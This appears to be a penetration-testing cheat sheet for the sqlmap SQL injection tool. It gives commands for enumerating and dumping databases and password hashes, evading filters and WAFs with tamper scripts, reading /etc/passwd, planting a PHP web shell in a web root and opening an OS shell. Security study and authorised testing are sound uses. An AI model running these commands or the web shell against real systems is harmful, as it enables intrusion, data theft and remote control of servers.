### Content 

- [Tuning](#tuning)
	- [UNION SQLi](#union-sqli)
	- [For debugging](#for-debugging)
	- [Level and Risk](#level-and-risk)
- [Database Enumeration](#database-enumeration)
	- [Privileges enumeration](#privileges-enumeration)
	- [Full DB enumeration](#full-db-enumeration)
	- [Table enumeration](#table-enumeration)
	- [Searching for data](#searching-for-data)
	- [Password Enumeration and Cracking](#password-enumeration-and-cracking)
- [Anti-Virus bypass techniques](#anti-virus-bypass-techniques)
	- [WAF](#waf)
	- [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
	- [Unique Value Bypass](#unique-value-bypass)
	- [Calculated Parameter Bypass](#calculated-parameter-bypass)
	- [Tamper Scripts](#tamper-scripts)
- [OS Exploitation](#os-exploitation)
	- [Reading Files](#reading-files)
	- [Writing Files](#writing-files)
	- [OS Command Execution](#os-command-execution)

> [Project Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

---
### Tuning

`--technique=BEUSTQ`:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

To target a specific parameter:

```bash
# Add (*) after the variable value
$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
# Add paramter flag
$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
# If it's a header
$ sqlmap http://www.example.com/ -H 'Cookie:PHPSESSID=1*'
$ sqlmap http://www.example.com/ -H "Cookie: id=1" -p Cookie
```

###### UNION SQLi

In some cases, `UNION` SQLi payloads require extra user-provided information to work.

- If we found the exact number of columns of the vulnerable SQL query: `--union-cols=17`
- If the default "dummy" filling values used are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead: `--union-char='a'`
- If there is a requirement to use an appendix at the end of a `UNION` query in the form of the: `--union-from=users`

###### For debugging

- To parse the DBMS error: `--parse-errors`
- To store the whole traffic: `-t`

###### Level and Risk

The usual structure of the payload `<prefix><vector><suffix>`, the `vector` part is carrying the useful SQL query to be executed, the `prefix` and the `suffix` are called boundaries which are being used for the proper injection of the vector.

```bash
$ sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

---
### Database Enumeration

[queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content.

#### Privileges enumeration

``` bash
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

#### Full DB enumeration

``` bash
# Retrieve all tables inside the database
$ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs -D testdb
# DB schema enumeration (retrieve the structure of all of the tables in all of the DBs)
$ sqlmap -u "http://www.example.com/?id=1" --schema
# DB schema enumeartion for non default DBs
$ sqlmap -u "http://www.example.com/?id=1" --schema --exclude-sysdbs
```

#### Table enumeration

``` bash
# Retrieve tabele names from testdb database
$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
# Retrieve table content
$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users
# Retrieve specific columns from the table
$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users -C name,surname
# Specify how many entries will be dumped from the table
$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users --start=2 --stop=3
# Conditional Enumeration
$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users --where="name LIKE 'f%'"
```

#### Searching for data

``` bash
# Search for a table that has user on its name
$ sqlmap -u "http://www.example.com/?id=1" --search -T user

# Search for a column that has pass on its name
$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

#### Password Enumeration and Cracking

```bash
# Crack passwords inside a specific table
$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

# DB Users Password Enumeration and Cracking
$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

---
### Anti-Virus bypass techniques

- `--random-agent`: Randomly select a `User-agent` header value.
- `--mobile`: Imitate the smartphone by using that same header value.
- `--chunked`: Blacklisted keywords are split between chunks to be passed unnoticed.

##### WAF

`SQLMap` will try to identify the `WAF` solution used by the web application by default, utilizing a third-party library [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. (`--skip-waf` to skip this test)

##### Anti-CSRF Token Bypass

```bash
$ sqlmap -u "http://<FQDN>/" --data="id=1&csrf-t0ken=token" --csrf-token="csrf-t0ken"
```

> If the flag `--csrf-token` is not set, if one of the provided parameters contains any of the common infixes (i.e. `csrf`, `xsrf`, `token`), the user will be prompted whether to update it in further requests.

##### Unique Value Bypass
  
```shell
$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
```

##### Calculated Parameter Bypass
  
```bash
$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

##### Tamper Scripts

Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection. `--tamper=between,randomcase`

`--list-tampers` to list all tamper scripts.

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

---
### OS Exploitation

Checking for DBA Privileges:

``` bash 
$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

##### Reading Files

To load the content of a file to a table and then reading that table in `MySql`, the DB user must have the privilege to `LOAD DATA` and `INSERT` to be able to execute a query like the following:

``` mysql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

To read a file:

``` bash
$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

##### Writing Files

``` bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

$ curl http://www.example.com/shell.php?cmd=ls+-la
```

##### OS Command Execution

``` bash
$ sqlmap -u "http://www.example.com/?id=1" --os-shell

# If there is no output from our command, try to specify another technique that has a better chance of giving us direct output like the Error-based SQL Injection
$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

---